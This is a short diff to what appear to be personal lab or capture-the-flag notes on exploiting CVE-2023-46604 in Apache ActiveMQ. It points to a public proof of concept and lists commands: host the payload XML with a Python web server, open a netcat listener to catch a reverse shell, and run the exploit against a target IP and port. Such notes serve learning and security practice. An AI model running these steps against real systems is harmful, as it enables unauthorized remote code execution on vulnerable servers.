@@ -33,6 +33,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 	* https://nvd.nist.gov/vuln/detail/CVE-2023-46604
 * looked up CVE-2023-46604 poc and got https://github.com/evkl1d/CVE-2023-46604
 	* The POC needs to be running on a webserver **you host** not on the website
+		* `python -m http.server`
 	* Also need a nc listener
 		* `sudo nc -nlvp 8100`
 	* THEN you run the exploit command: `python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>`
